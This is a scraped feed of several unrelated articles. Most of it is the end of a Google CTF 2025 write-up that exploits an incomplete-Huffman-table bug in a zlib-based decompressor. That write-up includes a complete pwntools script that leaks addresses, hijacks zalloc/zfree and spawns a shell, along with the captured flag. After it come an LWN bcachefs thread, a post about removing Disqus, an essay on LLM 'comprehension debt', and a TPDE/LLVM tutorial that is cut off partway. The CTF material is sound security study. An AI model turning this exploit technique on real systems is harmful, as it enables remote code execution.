p.interactive()&lt;/code&gt;&lt;p&gt;The PoC uses six blocks. Let’s walk through them.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================&lt;/code&gt;&lt;p&gt;Block 1: writes dummy bytes to the output buffer so that later copies with large distances won’t misbehave.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 2: prepares the ground for the bug by filling the table area with Distance symbols. Those entries will persist in uninitialized slots later.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 3: creates an incomplete Huffman table and references the uninitialized entry to perform LZ77 decoding. This actually triggers the bug and causes integer overflow in &lt;code&gt;avail_out&lt;/code&gt;. From this point on, boundary checks for the decompression buffer malfunction, enabling buffer overflow.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;As noted, to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, we must first fill the 8192‑byte output buffer. We use LZ77 and a stored block to push ~8120 bytes of padding.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to padding/alignment within&lt;/p&gt;&lt;code&gt;WebzState&lt;/code&gt;, we need 8120 bytes (not 8192) to reach just before&lt;code&gt;z_stream infstream&lt;/code&gt;. Also, because the decompression buffer is larger than the compressed input limit, we use LZ77 to generate many output bytes from little input.&lt;/quote&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================&lt;/code&gt;&lt;p&gt;The final block performs the actual overflow to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, letting us set its members arbitrarily.&lt;/p&gt;&lt;p&gt;Running the PoC confirms &lt;code&gt;z_stream infstream&lt;/code&gt; is overwritten.&lt;/p&gt;&lt;p&gt;The exploit is straightforward.&lt;/p&gt;&lt;code&gt;printf("Read receipt: %s\n", webz_state.infstream.msg);&lt;/code&gt;&lt;p&gt;First, by partially overwriting the &lt;code&gt;msg&lt;/code&gt; pointer in &lt;code&gt;infstream&lt;/code&gt; or setting it arbitrarily, we get arbitrary read.&lt;/p&gt;&lt;code&gt;local int updatewindow(z_streamp strm, const Bytef *end, unsigned copy) {
    struct inflate_state FAR *state;
    unsigned dist;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;

    /* if it hasn't been done already, allocate space for the window */
    if (state-&amp;gt;window == Z_NULL) {
        state-&amp;gt;window = (unsigned char FAR *)
                        ZALLOC(strm, 1U &amp;lt;&amp;lt; state-&amp;gt;wbits,
                               sizeof(unsigned char));
        if (state-&amp;gt;window == Z_NULL) return 1;
    }
...&lt;/code&gt;&lt;code&gt;int ZEXPORT inflateEnd(z_streamp strm) {
    struct inflate_state FAR *state;
    if (inflateStateCheck(strm))
        return Z_STREAM_ERROR;
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;window != Z_NULL) ZFREE(strm, state-&amp;gt;window);
    ZFREE(strm, strm-&amp;gt;state);
    strm-&amp;gt;state = Z_NULL;
    Tracev((stderr, "inflate: end\n"));
    return Z_OK;
}&lt;/code&gt;&lt;p&gt;Additionally, since &lt;code&gt;updatewindow&lt;/code&gt; and &lt;code&gt;inflateEnd&lt;/code&gt; call &lt;code&gt;zalloc&lt;/code&gt;/&lt;code&gt;zfree&lt;/code&gt;, control‑flow hijacking is easy.&lt;/p&gt;&lt;code&gt;import struct
from pwn import *

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0
    
    def bytebits(self):
        self.write_bits(0, 8 - (self.bit_count % 8))

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)

def create_exploit_stream(stream):
    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x200
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('X'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = [ ('EOB', 256) ]

    ll_lengths = [0] * 286
    ll_lengths[256] = 3 # EOB

    dist_lengths = [0] * 30
    for i in range(17,30):
        dist_lengths[i] = 15

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []

    symbol_stream.append(("INVALID", (8,10)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(('EOB', 256))
    ll_lengths = [0] * 286
    ll_lengths[256] = 10 # EOB
    ll_lengths[257] = 10 # Length 3
    ll_lengths[258] = 12 # Length 4

    dist_lengths = [0] * 30
    dist_lengths[17] = 3 # Distance ???

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 5) # dummy
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x10
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('C'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []
    symbol_stream.append(('LIT', 65))
    for i in range(0,0x2ce):
        symbol_stream.append(('LD', (10, 1)))
    for i in range(0,7):
        symbol_stream.append(('LIT', 65))
    symbol_stream.append(('EOB', 256))

    ll_lengths = [0] * 286
    ll_lengths[65] = 3  # 'A'
    ll_lengths[256] = 3 # EOB
    ll_lengths[264] = 3 # Length 10

    dist_lengths = [0] * 30
    dist_lengths[0] = 3 # Distance 1


    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

def overwrite_infstream(stream, pay):
    # STORED BLOCK ===============================================================================
    overwrriten_infstream = pay

    stream.write_bits(1, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = len(overwrriten_infstream)
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(overwrriten_infstream[i], 8)
    # STORED BLOCK =============================================================================

#p = process("./webz")
p = remote("webz.2025.ctfcompetition.com", 1337)

# POW =============================================================================
print(p.recv(1024))
answer = raw_input()
print(answer)
p.sendline(answer)
time.sleep(0.5)
# POW =============================================================================

def send_webz_payload(pay):
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)
    time.sleep(0.5)

# Leaking Pie Base By Partial-Overwrite =============================================================================
pay = b"x"*0x30 + p8(0x0)
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x1251b
print(f'pie_base = {hex(pie_base)}')
# Leaking Pie Base By Partial-Overwrite =============================================================================

# Leaking Libc Base By AAR =============================================================================
pay = b"x"*0x30 + p64(pie_base+0x12000) # free@got
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'receipt: ')
libc_base = u64(p.recvn(6)+b'\x00\x00') - 0xadd30
print(f'libc_base = {hex(libc_base)}')
# Leaking Libc Base By AAR =============================================================================

# Control Flow Hijacking By Overwriting zalloc =============================================================================
system_without_align_issue = libc_base+0x582d2
binsh = libc_base+0x1cb42f
jmp_to_zfree = pie_base+0x44da
dummy_memory = pie_base+0x13000
pay = b"\x00"*0x30 + p64(dummy_memory) + p64(dummy_memory) + p64(jmp_to_zfree) + p64(system_without_align_issue) + p64(binsh) * 30
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())
# Control Flow Hijacking By Overwriting zalloc =============================================================================

p.interactive()&lt;/code&gt;&lt;p&gt;This is the final exploit. It successfully retrieves the flag.&lt;/p&gt;&lt;quote&gt;&lt;code&gt;CTF{MaybeReadyToTry0clickH1ntEstimateBandwidth}&lt;/code&gt;&lt;/quote&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table-English"/><published>2025-09-30T06:50:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423004</id><title>Bcachefs removed from the mainline kernel</title><updated>2025-09-30T17:09:36.993171+00:00</updated><content>&lt;doc fingerprint="7613191d18a776f4"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Bcachefs removed from the mainline kernel&lt;/head&gt;
    &lt;quote&gt;It's now a DKMS module, making the in-kernel code stale, so remove it to avoid any version confusion."&lt;/quote&gt;
    &lt;p&gt; Posted Sep 30, 2025 10:30 UTC (Tue) by patrakov (subscriber, #97174) [Link] (1 responses) Here I see the risk of the mainline kernel reverting the changes in other subsystems, because they might no longer have an in-tree user. Am I paranoid? What's the Bcachefs project's position on this risk if it is material - are they going to adapt, or go back to telling the user to compile their tree, as opposed to compiling just their module against an existing kernel? Posted Sep 30, 2025 16:45 UTC (Tue) by georgh-cat (guest, #158897) [Link] Posted Sep 30, 2025 12:44 UTC (Tue) by daeler (subscriber, #130460) [Link] (3 responses) Posted Sep 30, 2025 12:56 UTC (Tue) by corbet (editor, #1) [Link] Posted Sep 30, 2025 12:57 UTC (Tue) by pizza (subscriber, #46) [Link] (1 responses) Linus (just like everyone else with the Linux sources, can add or remove anything he wants. Of course, nobody else is forced to get "Linux" from him directly. Indeed, the vastly overwhelming majority of Linux users get their kernel from someone else, with features, drivers, and fixes not present in, or removed outright from, Linus's Linux. Posted Sep 30, 2025 13:37 UTC (Tue) by Lionel_Debroux (subscriber, #30014) [Link] Posted Sep 30, 2025 15:41 UTC (Tue) by DemiMarie (subscriber, #164188) [Link] (1 responses) The only exception I can think of is if recovery is handled almost entirely in userspace, which is not tied to the kernel release cycle. Posted Sep 30, 2025 15:45 UTC (Tue) by intelfx (subscriber, #130118) [Link] So if you're developing something that "does not belong upstream", the second you need an in-kernel API modified to suit your code (or, conversely, the second an in-kernel API is modified in such a way that harms your code) — you are SOL. &lt;head&gt;Risks&lt;/head&gt;&lt;head&gt;Risks&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;head/&gt; Yes, Linus can make that kind of decision. He doesn't just do it on his own, though; there was a long series of public and private discussions that led up to this one. &lt;head&gt;Decision process&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;head&gt;Decision process&lt;/head&gt;&lt;lb/&gt; The older a third-party kernel version is, the more it is likely to be missing both backports for security fixes, and vulnerabilities in code introduced in newer versions but not backported to the given third-party kernel (some vendors perform large amounts of backports to their franken-kernels).&lt;head&gt;I think this was the right thing&lt;/head&gt;&lt;head&gt;I think this was the right thing&lt;/head&gt;&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://lwn.net/Articles/1040120/"/><published>2025-09-30T07:52:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423268</id><title>I’ve removed Disqus. It was making my blog worse</title><updated>2025-09-30T17:09:36.815751+00:00</updated><content>&lt;doc fingerprint="a2e43117070623c3"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Intro&lt;/head&gt;
    &lt;p&gt;This will be a short and sweet post. As I’m not big on goodbyes.&lt;/p&gt;
    &lt;p&gt;Disqus started showing ads for their “free” tier comments system a few years back. At the time, the communication they sent out via email, seemed quite laid-back and had the tone of “don’t worry about it, it’s not a big thing”. Which in part lead me to almost forget it happened.&lt;/p&gt;
    &lt;p&gt;At the time, the disqus comments system looked quite smart and sleek. I remember thinking that the ads system will possibly look smart and sleek too. Which alleviated any worries I had at the time.&lt;/p&gt;
    &lt;p&gt;WELL&amp;amp;mldr;&amp;amp;mldr;.I’ve just seen the ads, and they look horrific!!!&lt;/p&gt;
    &lt;head rend="h4"&gt;Apologies&lt;/head&gt;
    &lt;p&gt;I have a Pihole set up, so ads are blocked on my home network. When I’m out of the house, my phone is connected to a Wireguard VPN which routes my data through my home internet, therefore - getting all the ad-blocking, Pihole goodness.&lt;/p&gt;
    &lt;p&gt;After years with Pi-hole, which now blocks over a million domains, I’ve become incredibly accustomed to a mostly ad-free web. Without realizing it, Iâd forgotten what the typical internet experience feels like.&lt;/p&gt;
    &lt;p&gt;I used to get a couple of emails from Disqus, letting me know that there’s a new comment on this blog. I haven’t had many of these emails recently, so I decided to disable my adblocker for a few minutes and check out the comments.&lt;/p&gt;
    &lt;p&gt;There were none, instead I was greeted by some horribly formatted and obviously scammy ads:&lt;/p&gt;
    &lt;p&gt;For the people who read this blog, I’m sorry.&lt;/p&gt;
    &lt;p&gt;I became “blind” to what the web is really like for most users. Iâve tried to keep this blog minimalist - a clean place to find answers. Those ads not only ruin that experience; they trample privacy too:&lt;/p&gt;
    &lt;p&gt;With this post, Iâve removed Disqus. It was making my blog worse, and frankly, they were profiting off my work and my visitor’s data. I want this blog to be a resource for devs and technologists, free not just in money, but in freedom from unwanted tracking and invasive ads.&lt;/p&gt;
    &lt;head rend="h4"&gt;Any Alternatives?&lt;/head&gt;
    &lt;p&gt;Iâm not entirely sure comments are needed here. There are other ways to reach me, for example; GitHub or Twitter/X. But having a place for discussion under each post can be valuable. If you have any recommendations for alternative commenting systems (especially those that respect privacy or are self-hosted), Iâd love to hear them! Please reach out if youâve found something that works well.&lt;/p&gt;
    &lt;p&gt;Thanks as always for reading - your trust matters to me.&lt;/p&gt;
    &lt;p&gt;Sorry again for the mess!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ryansouthgate.com/goodbye-disqus/"/><published>2025-09-30T08:36:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423917</id><title>Comprehension debt: A ticking time bomb of LLM-generated code</title><updated>2025-09-30T17:09:36.750837+00:00</updated><content>&lt;doc fingerprint="87c012014d34283f"&gt;
  &lt;main&gt;
    &lt;p&gt;An effect that’s being more and more widely reported is the increase in time it’s taking developers to modify or fix code that was generated by Large Language Models.&lt;/p&gt;
    &lt;p&gt;If you’ve worked on legacy systems that were written by other people, perhaps decades ago, you’ll recognise this phenomenon. Before we can safely change code, we first need to understand it – understand what it does, and also oftentimes why it does it the way it does. In that sense, this is nothing new.&lt;/p&gt;
    &lt;p&gt;What is new is the scale of the problem being created as lightning-speed code generators spew reams of unread code into millions of projects.&lt;/p&gt;
    &lt;p&gt;Teams that care about quality will take the time to review and understand (and more often than not, rework) LLM-generated code before it makes it into the repo. This slows things down, to the extent that any time saved using the LLM coding assistant is often canceled out by the downstream effort.&lt;/p&gt;
    &lt;p&gt;But some teams have opted for a different approach. They’re the ones checking in code nobody’s read, and that’s only been cursorily tested – if it’s been tested at all. And, evidently, there’s a lot of them.&lt;/p&gt;
    &lt;p&gt;When teams produce code faster than they can understand it, it creates what I’ve been calling “comprehension debt”. If the software gets used, then the odds are high that at some point that generated code will need to change. The “A.I.” boosters will say “We can just get the tool to do that”. And that might work maybe 70% of the time.&lt;/p&gt;
    &lt;p&gt;But those of us who’ve experimented a lot with using LLMs for code generation and modification know that there will be times when the tool just won’t be able to do it.&lt;/p&gt;
    &lt;p&gt;“Doom loops”, when we go round and round in circles trying to get an LLM, or a bunch of different LLMs, to fix a problem that it just doesn’t seem to be able to, are an everyday experience using this technology. Anyone claiming it doesn’t happen to them has either been extremely lucky, or is fibbing.&lt;/p&gt;
    &lt;p&gt;It’s pretty much guaranteed that there will be many times when we have to edit the code ourselves. The “comprehension debt” is the extra time it’s going to take us to understand it first.&lt;/p&gt;
    &lt;p&gt;And we’re sitting on a rapidly growing mountain of it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://codemanship.wordpress.com/2025/09/30/comprehension-debt-the-ticking-time-bomb-of-llm-generated-code/"/><published>2025-09-30T10:37:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45423994</id><title>Using the TPDE Codegen Back End in LLVM Orc</title><updated>2025-09-30T17:09:36.635710+00:00</updated><content>&lt;doc fingerprint="263bd3580c0d17d8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Using the TPDE Codegen Backend in LLVM ORC&lt;/head&gt;
    &lt;p&gt;TPDE is a single-pass compiler backend for LLVM that was open-sourced earlier this year by researchers at TUM. The comprehensive documentation walks you through integrating TPDE into custom builds of Clang and Flang. Currently, it supports LLVM 19 and LLVM 20 release versions.&lt;/p&gt;
    &lt;head rend="h3"&gt;Integration in LLVM ORC JIT&lt;/head&gt;
    &lt;p&gt;TPDE’s primary strength lies in delivering low-latency code generation while maintaining reasonable &lt;code&gt;-O0&lt;/code&gt; code quality — making it an ideal choice for a baseline JIT compiler. LLVM’s On-Request Compilation (ORC) framework provides a set of libraries for building JIT compilers for LLVM IR. While ORC uses LLVM’s built-in backends by default, its flexible architecture makes it straightforward to swap in TPDE instead!&lt;/p&gt;
    &lt;p&gt;Let’s say we use the &lt;code&gt;LLJITBuilder&lt;/code&gt; interface to instantiate an off-the-shelf JIT:&lt;/p&gt;
    &lt;code&gt;ExitOnError ExitOnErr;
auto Builder = LLJITBuilder();
std::unique_ptr&amp;lt;LLJIT&amp;gt; JIT = ExitOnErr(Builder.create());
&lt;/code&gt;
    &lt;p&gt;The builder offers several extension points to customize the JIT instance it creates. To integrate TPDE, we’ll override the &lt;code&gt;CreateCompileFunction&lt;/code&gt; member, which defines how LLVM IR gets compiled into machine code:&lt;/p&gt;
    &lt;code&gt;Builder.CreateCompileFunction = [](JITTargetMachineBuilder JTMB)
    -&amp;gt; Expected&amp;lt;std::unique_ptr&amp;lt;IRCompileLayer::IRCompiler&amp;gt;&amp;gt; {
  return std::make_unique&amp;lt;TPDECompiler&amp;gt;(JTMB);
};
&lt;/code&gt;
    &lt;p&gt;To use TPDE in this context, we need to wrap it in a class that’s compatible with ORC’s interface:&lt;/p&gt;
    &lt;code&gt;class TPDECompiler : public IRCompileLayer::IRCompiler {
public:
  TPDECompiler(JITTargetMachineBuilder JTMB)
      : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())) {
    Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
    assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
  }

  Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; operator()(Module &amp;amp;M) override;

private:
  std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
  std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
};
&lt;/code&gt;
    &lt;p&gt;In the constructor, we initialize TPDE with a target triple (like &lt;code&gt;x86_64-pc-linux-gnu&lt;/code&gt;). TPDE currently works on ELF-based systems and supports both 64-bit Intel and ARM architectures (&lt;code&gt;x86_64&lt;/code&gt; and &lt;code&gt;aarch64&lt;/code&gt;). For now let’s assume that’s all we need. Now let’s implement the actual wrapper code:&lt;/p&gt;
    &lt;code&gt;Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; TPDECompiler::operator()(Module &amp;amp;M) {
  Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
  std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;B = *Buffers.back();

  if (!Compiler-&amp;gt;compile_to_elf(M, B)) {
    std::string Msg;
    raw_string_ostream(Msg) &amp;lt;&amp;lt; "TPDE failed to compile: " &amp;lt;&amp;lt; M.getName();
    return createStringError(std::move(Msg), inconvertibleErrorCode());
  }

  StringRef BufferRef{reinterpret_cast&amp;lt;char *&amp;gt;(B.data()), B.size()};
  return MemoryBuffer::getMemBuffer(BufferRef, "", false);
}
&lt;/code&gt;
    &lt;p&gt;Here’s what’s happening: we create a new buffer &lt;code&gt;B&lt;/code&gt; to store the compiled binary code, then pass both the buffer and the module &lt;code&gt;M&lt;/code&gt; to TPDE for compilation. If TPDE fails, we bail out with an error. On success, we wrap the result in a &lt;code&gt;MemoryBuffer&lt;/code&gt; and return it. (Note: LLVM still uses &lt;code&gt;char&lt;/code&gt; pointers for binary buffers and the three-way definition of &lt;code&gt;char&lt;/code&gt; in the C Standard falls on our feet sometimes, but it’s difficult to change in a mature codebase like LLVM.)&lt;/p&gt;
    &lt;p&gt;For the basic integration this is it! No need to patch LLVM — this works with official release versions. We can compile simple LLVM IR code already:&lt;/p&gt;
    &lt;code&gt;&amp;gt; cat 01-basic.ll 
; ModuleID = 'test.ll'
source_filename = "test.ll"

define i32 @main() {
entry:
  %1 = call i32 @custom_entry()
  %2 = sub i32 %1, 123
  ret i32 %2
}

define i32 @custom_entry() {
entry:
  ret i32 123
}
